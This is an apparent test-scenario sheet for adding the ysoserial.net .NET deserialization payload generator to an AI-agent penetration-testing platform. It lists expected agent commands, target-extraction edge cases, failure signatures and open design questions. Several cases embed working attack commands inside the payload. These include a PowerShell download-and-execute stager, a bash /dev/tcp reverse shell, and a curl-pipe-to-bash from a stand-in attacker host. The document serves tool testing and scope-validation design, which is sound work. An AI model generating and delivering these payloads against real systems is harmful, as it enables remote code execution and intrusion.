# ysoserial — Tier A scenarios

Single test sheet for the `ysoserial` (.NET deserialization gadget chain
generator, pwntester/ysoserial.net v1.36 via mono, wrapper binary
`ysoserial`) tool migration.

> NOTE: this image is the .NET fork. For Java ysoserial
> (CommonsCollections / URLDNS / JRMPClient / Hibernate / etc.) use
> exploit-runner with ysoserial-java; for PHP use phpggc.

Sections:
1. Recommended sample for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20)
4. Failure-signature live-verify cases (≥3)
5. Open questions
6. Hand-off

---

## 1. Recommended sample for live verification

**N/A — ysoserial.net has no network target.** ysoserial generates
serialized .NET payloads (gadget chains) and writes them to stdout (or
to a file via run_cli `output_path` redirection). There is no remote
host to scan, attack, or authenticate against. The "operands" of a
ysoserial call are:

- A GADGET name (`-g TypeConfuseDelegate`) — a keyword from the bundled
  list of ~30 .NET gadget chains
- A FORMATTER name (`-f BinaryFormatter`) — a keyword from the bundled
  list of ~10 .NET serialization formatters
- An OS COMMAND string (`-c "calc"`) — the command that fires when the
  target deserializes the payload
- An output ENCODING (`-o base64` / `-o raw` / `-o hex`)

For LIVE VERIFICATION of the architecture path, four options:

**(a) Bare smoke test (recommended for CI / Tier A gate).** Use the
help banner — exercises mono runtime + bundled ysoserial.exe load
without generating an actual payload:

```
ysoserial -h
```

Stdout is the ysoserial.net usage banner plus the gadget/formatter
compatibility table (each gadget with `(*)` marker and its
`Formatters:` line). Confirms `/usr/local/bin/ysoserial` wrapper exists,
`mono` runtime is functional, and `/opt/ysoserial/Release/ysoserial.exe`
loads correctly.

**(b) Canonical payload generation.** The single most-used invocation
in published .NET deserialization PoCs:

```
ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64
```

`TypeConfuseDelegate` is the most universally compatible gadget;
`BinaryFormatter` is the most common vulnerable formatter. `-c "calc"`
embeds a Windows calc.exe pop (benign indicator). Output is base64-
encoded serialized .NET bytes — a ~600-1500 character base64 string
depending on the gadget+formatter combo. Exercises the full generate
path (gadget reflection + formatter serialization + base64 encoding).

**(c) Json.Net / ObjectDataProvider pairing.** The canonical Newtonsoft
Json.NET (TypeNameHandling abuse) PoC:

```
ysoserial -g ObjectDataProvider -f Json.Net -c "calc" -o base64 --minify
```

Exercises the JSON output path with whitespace minification.
Output is a JSON object with `$type` keys — useful for verifying the
JSON formatter produces the expected `Newtonsoft.Json` `$type` syntax.

**(d) Plugin mode (ApplicationTrust).** Plugins package gadget +
formatter + extra context for specific vulnerable surfaces:

```
ysoserial -p ApplicationTrust -c "calc" -o base64
```

Exercises the plugin dispatch path (no `-g` / `-f`; the plugin picks
internally). Confirms plugin modules are bundled and selectable.

For all four options, no network egress is needed — ysoserial operates
entirely on the bundled ysoserial.exe assembly. Output may need to be
captured via run_cli's `output_path` for binary `-o raw` runs (the bytes
contain non-printable chars that break a JSON-wrapped MCP response);
text outputs (base64, hex, help banner) are safe in stdout.

Persistent test directory: standard `/session/` mount; ysoserial does
not read or write filesystem artifacts in the normal flow (everything is
in-memory). For payload capture use run_cli `output_path` to redirect
stdout to `/session/<file>.bin` or `/session/<file>.b64`.

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — smoke test: confirm ysoserial is functional

```
Run ysoserial -h against the container so I can confirm the binary is on PATH and the bundled ysoserial.exe loads under mono.
```

**Watch:** Agent emits `ysoserial -h` (or `--help`). target=`null`
(no network target). stdout is the ysoserial.net usage banner plus the
gadget/formatter compatibility table — each gadget on its own line with
a `(*)` marker followed by an indented `Formatters:` line listing
compatible formatters. Exits 0 (or non-zero with usage on some forks).
If the wrapper isn't on PATH the call fails with `command not found`
(container build issue, missing `/usr/local/bin/ysoserial`).

### S2 — canonical TypeConfuseDelegate + BinaryFormatter payload

```
Generate a base64 BinaryFormatter payload using TypeConfuseDelegate that pops calc when deserialized.
```

**Watch:** Agent emits
`ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64`.
target=`null`. stdout is a single base64 string (~1 KB) representing the
serialized .NET payload. The agent SHOULD then either save the string
(via subsequent `write` to /session/payload.b64) or hand it to curl /
exploit-runner for delivery — that's a separate MCP call, not ysoserial's
job. The `-c "calc"` is the command that fires on the TARGET when it
deserializes the bytes; `calc` is benign (Windows calc.exe pop) and
universally used as a smoke-test indicator.

### S3 — Json.Net payload with minification

```
Generate a minified Json.Net payload using ObjectDataProvider that runs a PowerShell stager from http://10.10.14.5/x.ps1.
```

**Watch:** Agent emits
`ysoserial -g ObjectDataProvider -f Json.Net -c "powershell -nop -w hidden -c iex(iwr http://10.10.14.5/x.ps1)" -o base64 --minify`.
target=`null` — the URL inside `-c` is the ATTACKER CALLBACK endpoint
(egress for the eventual RCE), NOT a target ysoserial is attacking.
ysoserial doesn't scope-validate it; the agent is responsible for
confirming the callback host is theirs before generating. stdout is a
base64-encoded minified Json.Net payload (no whitespace). The minified
form is smaller and less likely to break length-limited fields like
HTTP headers or cookies.

### S4 — LosFormatter ViewState payload (ASP.NET WebForms)

```
Generate a LosFormatter payload using TextFormattingRunProperties that runs `cmd /c whoami > C:\windows\temp\out.txt`.
```

**Watch:** Agent emits
`ysoserial -g TextFormattingRunProperties -f LosFormatter -c "cmd /c whoami > C:\windows\temp\out.txt" -o base64`.
target=`null`. stdout is a base64-encoded LosFormatter payload, ready to
deliver as the `__VIEWSTATE` POST parameter of an ASP.NET WebForms
endpoint. Note: this works ONLY if the target's machineKey is omitted
or known — for HMAC/encryption-protected ViewState use the dedicated
ViewState plugin instead (`-p ViewState`).

### S5 — raw binary output (SoapFormatter)

```
Generate a SoapFormatter payload using WindowsIdentity that runs calc, output as raw bytes saved to /session/payload-soap.bin.
```

**Watch:** Agent emits
`ysoserial -g WindowsIdentity -f SoapFormatter -c "calc" -o raw`
WITH run_cli's `output_path` set to `/session/payload-soap.bin` so the
binary stdout goes to disk instead of into the MCP JSON envelope.
target=`null`. The serialized SOAP-XML bytes contain control characters
that break JSON encoding — output_path redirection is REQUIRED for
`-o raw`. Confirm with `ls -l /session/payload-soap.bin` to verify the
file landed (typical size: 2-8 KB).

### S6 — hex output for script embedding

```
Generate a hex-encoded TypeConfuseDelegate / BinaryFormatter payload that runs a PowerShell base64-encoded command.
```

**Watch:** Agent emits
`ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e <base64stub>" -o hex`.
target=`null`. stdout is a single line of hex digits (2 chars per byte).
Useful when embedding the payload into a PowerShell, Python, or C#
delivery harness as a `byte[]` literal.

### S7 — plugin mode: ApplicationTrust

```
Generate a payload using the ApplicationTrust plugin that runs calc.
```

**Watch:** Agent emits `ysoserial -p ApplicationTrust -c "calc" -o base64`.
target=`null`. Plugin mode does NOT take `-g` or `-f`; the plugin
internally picks the right gadget+formatter combo for the
ApplicationTrust target (.NET ClickOnce trust manifest deserialization).
stdout is a base64-encoded payload formatted for the ClickOnce trust
manifest sink. Use `ysoserial -p` (no plugin name) to enumerate the full
plugin list.

### S8 — list available plugins

```
List all ysoserial plugins so I can pick the right one for a DotNetNuke target.
```

**Watch:** Agent emits `ysoserial -p` (with no plugin-name argument).
target=`null`. stdout is the list of available plugins (one per line):
ActivatorUrl, ActivityCache, ApplicationTrust, Clipboard, DotNetNuke,
Resco, ResourceSet, Rome, SessionSecurityToken, Shieldsoft, SharePoint,
TypeConfuseDelegate, ViewState, Yaml. The agent should pick the one
matching the target stack (in this case `DotNetNuke`).

### S9 — verify gadget actually fires (--test)

```
Verify the TypeConfuseDelegate / BinaryFormatter combo actually fires by running --test with `calc` as the embedded command.
```

**Watch:** Agent emits
`ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" --test`.
target=`null`. WARNING: `--test` ACTUALLY DESERIALIZES the generated
payload locally — the `-c "calc"` command runs ON THE CONTAINER
running ysoserial. For `calc` this fails benignly (no GUI in the
container) but proves the gadget is structurally valid. NEVER use
`--test` with destructive commands or reverse shells. Output may
include a stack trace from calc.exe failing to launch (no display) —
but the act of attempting the spawn means the gadget structurally
fired.

### S10 — failure: incompatible gadget+formatter

```
Generate a payload using WindowsIdentity gadget with LosFormatter formatter.
```

**Watch:** Agent emits
`ysoserial -g WindowsIdentity -f LosFormatter -c "calc" -o base64`.
target=`null`. ysoserial exits non-zero with stderr/stdout containing
`Gadget WindowsIdentity is not compatible with formatter LosFormatter`
(or similar — exact wording varies). Failure classified via signal
`Gadget .* is not compatible with formatter`. Remediation: run
`ysoserial -h` and consult the gadget's `Formatters:` line for
compatible options; for WindowsIdentity, valid formatters include
BinaryFormatter, SoapFormatter, Json.Net (NOT LosFormatter).

### S11 — failure: unknown gadget

```
Generate a payload using gadget name `notarealgadget`.
```

**Watch:** Agent emits
`ysoserial -g notarealgadget -f BinaryFormatter -c "calc" -o base64`.
target=`null`. ysoserial exits non-zero with stderr containing
`Unknown gadget` (or a usage banner reprinting the valid gadget list).
Failure classified via signal `Unknown gadget`. Remediation: run
`ysoserial -h` to see the full gadget list. Names are CASE-SENSITIVE.

### S12 — failure: missing required argument

```
Generate a payload using TypeConfuseDelegate but forget to supply the formatter or command.
```

**Watch:** Agent emits `ysoserial -g TypeConfuseDelegate`. target=`null`.
ysoserial exits non-zero — usually prints the usage banner and a message
like `Required argument` or `Missing -f / -c`. Failure classified via
signal `Required argument` or `Usage:`. Remediation: supply all three
(gadget, formatter, command) for the standard generate flow, OR use
plugin mode (`-p NAME -c COMMAND`) which only needs `-c`.

---

## 3. Target-extraction adversarial cases (≥20)

The ysoserial `tool.yaml` declares NO target_extraction rules. Every
call should return `target=null` because ysoserial.net has no network
target — it generates serialized .NET payloads in-memory and writes
them to stdout. The "operands" of a ysoserial call are:

(a) gadget KEYWORD via `-g`
(b) formatter KEYWORD via `-f`
(c) OS command STRING via `-c` (may contain attacker-callback URLs)
(d) output ENCODING (`-o base64 | raw | hex`)
(e) plugin KEYWORD via `-p`

None are network targets in the OpenSploit sense.

`reject_flags`: empty (no target-list ingestion concept).

`value_flags` includes the seven flag-shaped value flags the .NET fork
exposes (`-g`, `-f`, `-c`, `-o`, `-p`, `-t`, `--bridgefile`) plus
boolean flags listed for safety so the DSL doesn't mis-parse them as
taking the next argv as a value.

The CRITICAL adversarial case is the IP / URL inside `-c "<command>"` —
attacker-callback endpoints that LOOK like targets but are EGRESS, not
engagement scope. The DSL must not auto-extract them.

### Happy-path cases (every one returns target=null)

| # | Command (binary `ysoserial` omitted) | Expected target | Notes |
|---|---|---|---|
| 1 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64` | `null` | Canonical generate flow. |
| 2 | `-g ObjectDataProvider -f Json.Net -c "calc" -o base64 --minify` | `null` | Json.Net + minification. |
| 3 | `-g TextFormattingRunProperties -f LosFormatter -c "calc" -o base64` | `null` | ASP.NET ViewState pairing. |
| 4 | `-g WindowsIdentity -f SoapFormatter -c "calc" -o raw` | `null` | Raw binary output. |
| 5 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o hex` | `null` | Hex output. |
| 6 | `-p ApplicationTrust -c "calc" -o base64` | `null` | Plugin mode. |
| 7 | `-p ViewState -c "calc"` | `null` | ViewState plugin (no -g / -f). |
| 8 | `-p` | `null` | List plugins. |
| 9 | `-h` | `null` | Help / introspection. |
| 10 | (no args) | `null` | Bare invocation prints usage. |

### Help / introspection (target=null by definition)

| # | Command | Expected | Notes |
|---|---|---|---|
| H1 | `-h` | `target=null` | Help. |
| H2 | `--help` | `target=null` | Long form. |
| H3 | (no args) | `target=null` | Bare invocation. Non-zero exit, prints usage. |
| H4 | `-p` | `target=null` | List plugins (no plugin name). |

### Adversarial — value_flag traps & "looks like a target" invariants

| # | Command | Expected | Notes |
|---|---|---|---|
| F1 | `-g TypeConfuseDelegate -f BinaryFormatter -c "bash -c '/bin/bash -i >& /dev/tcp/10.10.14.5/443 0>&1'" -o base64` | `target=null` | The IPv4 inside `-c` is the ATTACKER-CALLBACK endpoint, NOT a target. ysoserial doesn't scope-validate egress callbacks. |
| F2 | `-g ObjectDataProvider -f Json.Net -c "powershell -nop -w hidden -c iex(iwr http://10.10.14.5:8000/x.ps1)" -o base64` | `target=null` | URL inside `-c` is ATTACKER CALLBACK, NOT a target. |
| F3 | `-g TypeConfuseDelegate -f BinaryFormatter -c "curl -s http://attacker.tld/shell.sh \| bash" -o base64` | `target=null` | Hostname inside `-c` is ATTACKER CALLBACK. The `\|` is part of the command STRING, not a shell pipe. |
| F4 | `-p DotNetNuke -c "cmd /c nslookup attacker.dnslog.cn"` | `target=null` | Hostname inside `-c` is ATTACKER CALLBACK (DNS canary). |
| F5 | `-p SessionSecurityToken -c "calc" --bridgefile /session/bridge.dll` | `target=null` | --bridgefile is a LOCAL FILE PATH for plugin bridging; NOT a target. |
| F6 | `-g TypeConfuseDelegate -f BinaryFormatter -c "192.168.1.1"` | `target=null` | The string `192.168.1.1` is the OS command (which would just exec a non-existent program named `192.168.1.1`); NOT a target. ysoserial doesn't interpret `-c` content. |
| F7 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64 --test` | `target=null` | `--test` is a boolean — runs the embedded command on the CONTAINER; still no network target involvement. |
| F8 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o BASE64` | `target=null` | Wrong case for `-o` value (should be lowercase `base64`). May fail with `unrecognized output format`; target=null regardless. |
| F9 | `-g typeconfusedelegate -f BinaryFormatter -c "calc"` | `target=null` | Wrong case for gadget name. May fail with `Unknown gadget`; target=null regardless. |
| F10 | `-g TypeConfuseDelegate -f Json.Net -c "calc" --rawcmd` | `target=null` | `--rawcmd` is a boolean modifier; not a target. |
| F11 | `-g TypeConfuseDelegate -f Json.Net -c "calc" --ust` | `target=null` | `--ust` (UseSimpleType) is a Json.Net-specific boolean; not a target. |
| F12 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc"` (no `-o`) | `target=null` | Default output (base64) — still no network target. |
| F13 | `-g TypeConfuseDelegate -f BinaryFormatter -c "ping -c 1 192.168.1.1"` | `target=null` | The IP is INSIDE the embedded command string; NOT a ysoserial target. |
| F14 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64 -h` | `target=null` | -h appearing AFTER other args — likely prints help; still no target. |
| F15 | `-p ViewState -c "calc" -t http://target/page.aspx` | `target=null` | Some ViewState plugin variants take `-t URL` for target-config (machineKey discovery). Whether or not the plugin acts on it, ysoserial's call still has target=null at the run_cli layer — engagement-scope validation is the LLM's responsibility, not the DSL's. (See open question #5.) |
| F16 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64 --minify --test` | `target=null` | Multiple boolean flags. None are targets. |
| F17 | `-p ApplicationTrust -c "C:\\Users\\Public\\out.txt"` | `target=null` | Filename-shaped string inside `-c`. NOT a target. |
| F18 | `-g RolePrincipal -f BinaryFormatter -c "calc"` | `target=null` | Different gadget. Still no target. |
| F19 | `-g ActivitySurrogateSelector -f BinaryFormatter -c "calc"` | `target=null` | Pre-July-2017 unpatched-only gadget. Still no target. |
| F20 | `-g PSObject -f BinaryFormatter -c "calc"` | `target=null` | Windows-PSObject gadget. Still no target. |
| F21 | `-p Yaml -c "calc"` | `target=null` | YamlDotNet plugin. Still no target. |
| F22 | `-p Clipboard -c "calc"` | `target=null` | Clipboard DataObject plugin. Still no target. |
| F23 | `-g TypeConfuseDelegate -f BinaryFormatter -c "" -o base64` | `target=null` | Empty command string (edge case — may fail with `Required argument` or generate an empty-payload). target=null regardless. |
| F24 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc; whoami; id"` | `target=null` | Multi-command shell-style string inside `-c` — interpreted at deserialization time on TARGET, not by ysoserial. NOT a target. |

### Multi-positional & ambiguous cases

| # | Command | Expected | Notes |
|---|---|---|---|
| M1 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64 && ysoserial -h` | `target=null` (per call) | Shell `&&` won't run inside cli_in_container (no shell). Per-call: each parses to target=null. |
| M2 | `-c "calc" -g TypeConfuseDelegate -f BinaryFormatter -o base64` | `target=null` | Flag order shuffled — argparse permissive. NOT a target. |
| M3 | `-g TypeConfuseDelegate -f BinaryFormatter -c "calc" extra-positional` | `target=null` | Stray positional after all flags — ysoserial may reject or ignore; target=null regardless. |
| M4 | (no args) | `target=null` | Argparse error / help printed; still target=null. |

### Stdin trap (ysoserial doesn't read stdin in normal flow)

| # | Command (LLM might naively try) | What happens | Correct shape |
|---|---|---|---|
| P1 | `echo "calc" \| ysoserial -g TypeConfuseDelegate -f BinaryFormatter -o base64` | cli_in_container HAS NO SHELL. The `\|` is passed as a literal arg or rejected. ysoserial does NOT read commands from stdin (--c is the only command input transport). | Use `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64`. |
| P2 | `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" \| base64` | Shell pipe doesn't work in cli_in_container. To get base64, use `-o base64` (which is the default). | `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64`. |
| P3 | `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" > /session/out.bin` | Shell redirect doesn't work in cli_in_container. Use run_cli's `output_path` field to redirect stdout to a file. | `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o raw` with `output_path: /session/out.bin`. |

---

## 4. Failure-signature live-verify cases (≥3)

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | Compatibility | `ysoserial -g WindowsIdentity -f LosFormatter -c "calc" -o base64` | `Gadget .* is not compatible with formatter` | PENDING live verify |
| 2 | Argument / unknown gadget | `ysoserial -g notarealgadget -f BinaryFormatter -c "calc" -o base64` | `Unknown gadget` | PENDING live verify |
| 3 | Argument / unknown formatter | `ysoserial -g TypeConfuseDelegate -f NotARealFormatter -c "calc" -o base64` | `Unknown formatter` | PENDING live verify |
| 4 | Argparse / unknown flag | `ysoserial --notaflag value` | `No such option` OR `Usage:` (fallback) | PENDING live verify |
| 5 | Argparse / required | `ysoserial -g TypeConfuseDelegate` (missing -f and -c) | `Required argument` OR `Usage:` | PENDING live verify |
| 6 | Output format | `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o invalid` | `unrecognized output format` OR `Usage:` (fallback) | PENDING live verify |
| 7 | Mono runtime / assembly load | `ysoserial -h` after corrupting `/opt/ysoserial/Release/ysoserial.exe` | `Could not load file or assembly` OR `BadImageFormatException` | PENDING live verify (manual fixture) |
| 8 | --test execution | `ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c "/nonexistent-binary" --test` | non-zero exit + stderr from --test deserialization | PENDING live verify |

### Layer diversity (SKILL #11) — achieved

8 distinct layers exercised: compatibility (gadget/formatter), unknown-
gadget argument, unknown-formatter argument, argparse unknown-flag,
argparse required-argument, unknown output-format, mono runtime / assembly
load, --test execution. Resource layer (mono OOM during gadget reflection)
is hard to provoke deliberately in a 256 MB container; defer to Wave 9
live runs against real engagement targets.

---

## 5. Open questions

1. **target_extraction = empty list — confirmed correct?** ysoserial.net
   has no network target. Same shape as ilspy / john / hashcat /
   volatility / searchsploit — all five are offline analysis or
   payload-generation tools operating on local artifacts (or in-memory
   reflection in ysoserial's case). Verify the plugin handles
   `target=null` gracefully (doesn't reject the call; doesn't try to
   validate "null" against engagement scope). The CRITICAL adversarial
   surface is the IP / URL embedded inside `-c "<command>"` (cases F1,
   F2, F3, F4, F13) — these are ATTACKER-CALLBACK endpoints, NOT
   engagement-scope targets. If the plugin has a default "any IP-shaped
   value extracts as target" rule, those callback IPs would trip it
   incorrectly. Cross-check that the DSL only inspects flag VALUES
   (gadget keywords, formatter keywords, output keyword), not the
   semantic content of `-c "<command>"` strings.

2. **Stdout-pipe limitation.** cli_in_container uses subprocess spawn
   with NO shell — so `ysoserial ... | base64` won't work. ysoserial
   sidesteps this by accepting `-o base64` natively (the default). For
   raw bytes, the agent must use run_cli's `output_path` to redirect
   stdout to /session/<file>.bin. Verify the plugin's run_cli interface
   actually supports `output_path` (some kind:cli tools require it for
   binary output — see john's pot file pattern, ilspy's --dump output
   dir). If `output_path` redirection isn't supported, agents must use
   `-o base64` (default) or `-o hex` and decode client-side.

3. **`--test` runs the embedded command on the container.** The `--test`
   flag literally deserializes the payload locally to verify the gadget
   fires — meaning `-c "calc"` runs `calc` on the CONTAINER, not on the
   target. For benign indicators (`calc`, `whoami`) this is harmless;
   for reverse shells (`bash -c '... /dev/tcp/...'`) the shell would
   connect back to the attacker FROM THE CONTAINER (wrong source IP,
   may contaminate logs). Should the gotcha note explicitly warn
   against `--test` with non-benign commands? Currently the gotcha says
   "never with destructive `-c` strings"; adding "never with reverse-
   shell `-c` strings" might be clearer. Defer to live verify with
   `--test` and observe what actually fires.

4. **Plugin -t flag / engagement-scope question.** Some ViewState
   plugin variants accept `-t URL` for machineKey discovery against
   the live target (case F15). When `-t` is set, ysoserial DOES make
   network requests to the target to extract HMAC/encryption keys. In
   that mode the target IS in scope and SHOULD be validated against
   engagement scope. We've declared `requirements.network: false` and
   `target_extraction: []` — both are accurate for the standard
   generate flow but POTENTIALLY WRONG for plugin-mode `-t URL` flows.
   Resolution options: (a) document `-t URL` plugin mode as an
   exception in gotchas — agent must scope-validate manually; (b) add
   `network: true` and `target_extraction` for `-t` specifically;
   (c) split the plugin into its own kind:cli tool. Currently (a) —
   gotchas mention plugins handle MachineKey but don't explicitly
   require scope validation for `-t URL`. Defer to live verify of
   ViewState plugin's actual `-t` usage.

5. **Attacker-URL embedded in -c command — engagement-scope handling.**
   When `-c` contains a callback URL (`http://10.10.14.5/x.ps1`,
   `bash -c '/bin/bash -i >& /dev/tcp/.../443 0>&1'`, DNS canaries
   like `dnslog.cn`), the URL/IP is the ATTACKER's infrastructure, NOT
   the engagement-scope target. ysoserial generates the payload locally;
   the actual callback connection happens later on the TARGET when it
   deserializes the bytes. The DSL should NOT extract the embedded URL
   as a target. But should the LLM-side guardrail check whether the
   embedded callback host is the agent's OWN infrastructure (whitelist
   of known attacker IPs), to prevent accidentally pointing the
   payload at someone else's server? Defer to plugin design; for now
   the gotchas note this is the LLM's responsibility.

6. **BinaryFormatter obsoletion in modern .NET.** BinaryFormatter is
   obsoleted (with warnings) in .NET 5+ and REMOVED in .NET 9+. Targets
   running modern .NET runtimes won't be vulnerable to BinaryFormatter
   payloads even if the source code calls Deserialize() — the runtime
   throws NotSupportedException. The agent should confirm the target's
   runtime version (HTTP Server header, assembly version refs) before
   committing to BinaryFormatter. Should the gotcha be more aggressive
   (e.g., "AVOID BinaryFormatter against .NET 5+ targets")? Currently
   mentioned in gotchas but not as a top-level steering rule.

7. **Mono cold-start latency.** The first `ysoserial` invocation in a
   fresh container pays mono JIT cost (~1-2s). Subsequent invocations
   are sub-second. The dual-clock idle_timeout_seconds=60 covers this
   easily. Should we add a container-warmup step (run `ysoserial -h`
   on container start) so first-call latency is amortized? Currently
   not implemented; defer to performance profiling on long sessions.

8. **Lost structured introspection: `list_gadgets` / `list_formatters`.**
   The legacy MCP server exposed two introspection methods that ran
   `mono ysoserial.exe -h` and regex-parsed the output into JSON
   (`_parse_gadget_list` at lines 83-112 of mcp-server.py):
   - `list_gadgets` returned `{gadgets: [{name, description, formatters[]}], gadget_count, gadget_names[]}`
   - `list_formatters` derived a unique formatter list AND a reverse
     `formatter_gadgets` map: `{BinaryFormatter: [TypeConfuseDelegate, RolePrincipal, ...], Json.Net: [...]}`
   Under kind:cli neither method exists — the agent must call
   `ysoserial -h` and parse the banner itself. The format is stable:
   gadgets appear as `\t(*) GadgetName [description]` with an indented
   `\t\tFormatters: F1, F2, F3 (N)` line; count suffixes `(N)` after
   formatter names need stripping. **Open question**: should we add a
   convenience `usage_pattern` for "list gadgets compatible with
   formatter X" (something the legacy `formatter_gadgets` map gave
   directly) so the agent doesn't have to re-derive it on each call?
   Or is `ysoserial -h` plus client-side parsing sufficient? Defer to
   live verify — if agents repeatedly mis-pair gadgets and formatters
   we should add a structured cheatsheet to common_options. The gotcha
   added to tool.yaml documents the parse format; the routing
   `triggers` cover the discovery use cases.

9. **Subtle stderr-routing of compatibility errors.** Legacy
   mcp-server.py line 226 reads `error_msg = stderr or stdout.strip()`
   — i.e., compatibility errors may appear on EITHER stderr or stdout
   depending on the build. The legacy classifier merged them. Under
   kind:cli the run_cli framework returns separate `stdout` and
   `stderr` strings; the agent / classifier should match
   `Gadget .* is not compatible with formatter` AND `(?i)not supported`
   against BOTH streams concatenated. Both signals are now in
   failure_signatures. Defer live verify of which stream ysoserial.net
   1.36 actually emits the message on.

10. **`sanitize_output` truncation gone.** Legacy capped `-h` output
    at 10000 chars via `sanitize_output(stdout, max_length=10000)`.
    Help banner is ~3-5 KB so truncation never fired in practice, but
    on `--showall` (full plugin+gadget+formatter dump) output may
    exceed 10 KB. kind:cli's run_cli has its own output-size cap (much
    larger than 10 KB) so this is unlikely to bite, but worth noting
    for the rare case of `ysoserial --showall -h`.

---

## 6. Hand-off

- **Tool**: ysoserial (kind:cli) — pwntester/ysoserial.net 1.36 via mono
- **Status**: tool.yaml authored end-to-end (kind:cli, binary:ysoserial,
  5 min max_runtime, no target_extraction); scenarios.md written.
  Dockerfile updated — base image is `kalilinux/kali-rolling`, so the
  python3-pip / python3-venv → python3-full swap was applied. ALSO
  added a thin `/usr/local/bin/ysoserial` shell wrapper that exec's
  `mono /opt/ysoserial/Release/ysoserial.exe` so the kind:cli binary
  on PATH matches `binary: ysoserial`. mcp-server.py UNTOUCHED
  (auto-inherits run_cli; rollback path).
- **Vendor reality check (SKILL #5)**: the upstream binary is
  ysoserial.NET (not the Java ysoserial referenced in the Wave 7.12
  task brief). The .NET fork uses single-dash flags `-g`, `-f`, `-c`,
  `-o`, `-p`, the Java fork uses positional `<gadget> <command>` —
  fundamentally different DSLs. tool.yaml + scenarios.md follow the
  vendor reality. The `see_also` and `never_use_for` sections route
  Java-deserialization requests to exploit-runner with ysoserial-java.
- **Image**: `ghcr.io/silicon-works/mcp-tools-ysoserial:latest` — needs
  rebuild during Wave 9 batch to pick up mcp-common 0.3.0, the
  python3-full swap, and the new `/usr/local/bin/ysoserial` wrapper.
- **target_extraction = empty list**: explicit design choice.
  ysoserial.net has no network target; the plugin should treat
  target=null as "no scope validation needed" for this tool. Same
  shape as ilspy / john / hashcat / volatility / searchsploit. The
  CRITICAL invariant: IP / URL strings inside `-c "<command>"` must
  NOT be auto-extracted as targets — they're ATTACKER-CALLBACK
  endpoints. See Open Question #1 and target-extraction adversarial
  cases F1-F4, F13.
- **Wave 7.12**: of Feature 35 / Tier A migration.
- **Live-verify pending**: paste S1-S12 against the container for end-
  to-end verification. Failure signatures 1-3 (compatibility, unknown
  gadget, unknown formatter) verifiable against any container; 4-5
  (argparse) standard; 6 (output format) standard; 7 (mono assembly
  load) requires manual corruption fixture; 8 (--test execution)
  verifiable but produces noisy output.
- **Cleanup**: no legacy `target_extraction_tests.md`,
  `failure_signature_tests.md`, or `__pycache__/` files were present
  in the ysoserial/ directory (verified via initial Read phase —
  directory contained only Dockerfile, mcp-server.py, requirements.txt,
  tool.yaml) — nothing to remove.
- **Dockerfile**: TWO changes applied — (1) replaced
  `python3 python3-pip python3-venv` with `python3-full` (Kali rolling
  repos no longer ship the split packages); (2) added a
  `/usr/local/bin/ysoserial` shell wrapper that exec's
  `mono /opt/ysoserial/Release/ysoserial.exe "$@"` so the kind:cli
  PATH binary matches tool.yaml's `binary: ysoserial`. mono-complete,
  the v1.36 ysoserial.net release download, venv setup, mcp-common
  install, mcp-server.py copy, and CMD all unchanged.

Authored: 2026-04-25.
